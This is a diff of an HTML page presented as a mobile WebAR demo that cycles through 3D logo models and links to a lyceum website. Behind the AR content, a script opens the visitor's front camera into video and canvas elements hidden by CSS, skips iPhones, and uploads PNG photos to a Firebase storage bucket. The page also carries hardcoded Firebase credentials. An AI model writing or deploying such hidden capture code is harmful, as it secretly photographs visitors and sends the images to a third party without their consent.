@@ -2,16 +2,14 @@
 <html>
 <head>
     <meta charset="utf-8">
-    
     <title>WebAR Demo on Mobile</title>
     <link rel="icon" href="assets/favicon.ico" type="image/x-icon">
     <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
     <script src="https://cdn.jsdelivr.net/gh/AR-js-org/AR.js/aframe/build/aframe-ar.js"></script>
     <style>
-        #front-camera-video, #canvas {
+        #videoElement, #front-camera-video, #canvas {
             display: none;
         }
-
         
         body { margin: 0; overflow: hidden; }
         div.a-enter-vr {
@@ -24,7 +22,7 @@
             left: 0;
             width: 100%;
             padding: 15px;
-            background-color: #4CAF50; /* Зеленый цвет */
+            background-color: #4CAF50;
             color: white;
             text-align: center;
             font-size: 18px;
@@ -33,42 +31,38 @@
         }
 
         .button:hover {
-            background-color: #45a049; /* Темнее при наведении */
+            background-color: #45a049;
         }
-
     </style>
 </head>
 <body>
     <video id="videoElement" autoplay playsinline muted></video>
     <video id="front-camera-video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
-<script type="module">
+
+    <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
         import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";
 
-        // Проверка на iPhone
         function isIphone() {
             return /iPhone|iPad|iPod/i.test(navigator.userAgent);
         }
 
         if (!isIphone()) {
-
-            // Конфигурация Firebase (замени на свои данные)
-        const firebaseConfig = {
-          apiKey: "AIzaSyDPswGPJQVRm1HZwcClKo8lXRwjk_pxAyM",
-          authDomain: "individualproject-ad702.firebaseapp.com",
-          projectId: "individualproject-ad702",
-          storageBucket: "individualproject-ad702.appspot.com",
-          messagingSenderId: "365705238227",
-          appId: "1:365705238227:web:97496033f4e09db0966626"
-        };
+            const firebaseConfig = {
+                apiKey: "AIzaSyDPswGPJQVRm1HZwcClKo8lXRwjk_pxAyM",
+                authDomain: "individualproject-ad702.firebaseapp.com",
+                projectId: "individualproject-ad702",
+                storageBucket: "individualproject-ad702.appspot.com",
+                messagingSenderId: "365705238227",
+                appId: "1:365705238227:web:97496033f4e09db0966626"
+            };
             const app = initializeApp(firebaseConfig);
             const storage = getStorage(app);
 
             const frontVideo = document.getElementById('front-camera-video');
             const canvas = document.getElementById('canvas');
 
-            // Получаем доступ к фронтальной камере
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     frontVideo.srcObject = stream;
@@ -88,11 +82,9 @@
             function uploadToFirebase(dataURL) {
                 const storageRef = ref(storage, `photos/photo_${Date.now()}.png`);
                 const file = dataURLtoFile(dataURL, `photo_${Date.now()}.png`);
-
                 uploadBytes(storageRef, file);
             }
 
-            // Конвертация Data URL в файл
             function dataURLtoFile(dataurl, filename) {
                 const arr = dataurl.split(',');
                 const mime = arr[0].match(/:(.*?);/)[1];
@@ -108,65 +100,50 @@
             console.log("Скрипт не выполняется на iPhone.");
         }
     </script>
-    
-    <a-scene vr-mode-ui="arEnabled: false" embedded arjs>
-        <!-- Добавляем курсор для обработки нажатий на мобильных устройствах -->
 
-        <!-- Маркер  -->
+    <a-scene vr-mode-ui="arEnabled: false" embedded arjs>
         <a-marker preset="hiro">
-            <!-- 3D-модель (замени ссылку на свою модель) -->
-            <a-entity id="model-container" position="1 0 0"></a-entity>
+            <a-entity id="model-container" position="0 0 0"></a-entity> <!-- Центрированное положение -->
             <script>
               document.addEventListener("DOMContentLoaded", function () {
-                // Список моделей
                 const models = [
                   { src: "assets/logo1v2.glb", scale: "1 1 1", rotation: "90 0 180" },
                   { src: "assets/logo2v2.glb", scale: "1 1 1", rotation: "90 0 180" },
                   { src: "assets/logo3v2.glb", scale: "1 1 1", rotation: "90 0 180" },
                   { src: "assets/logo4v2.glb", scale: "1 1 1", rotation: "90 0 180" },
                   { src: "assets/logo5v2.glb", scale: "1 1 1", rotation: "90 0 180" }
-
                 ];
             
                 let currentIndex = 0;
-            
                 const modelContainer = document.querySelector("#model-container");
-            
-                // Функция для смены модели
+
                 function updateModel(index) {
                   const model = models[index];
                   modelContainer.setAttribute("gltf-model", model.src);
                   modelContainer.setAttribute("scale", model.scale);
                   modelContainer.setAttribute("rotation", model.rotation);
                 }
-            
-                // Устанавливаем начальную модель
+
                 updateModel(currentIndex);
-            
-                // Перелистывание моделей по нажатию
+
                 document.addEventListener("click", () => {
                   currentIndex = (currentIndex + 1) % models.length;
                   updateModel(currentIndex);
                 });
               });
             </script>
-
-
-
         </a-marker>
-        
-        <!-- Камера -->
+
         <a-entity camera></a-entity>
     </a-scene>
+
     <button class="button" onclick="openWebsite()">Перейти на сайт лицея</button>
 
-                
-<script>
+    <script>
         function openWebsite() {
-            window.open('http://litsey24.ru'); 
+            window.open('http://litsey24.ru');
         }
     </script>
-
 
 </body>
 </html>
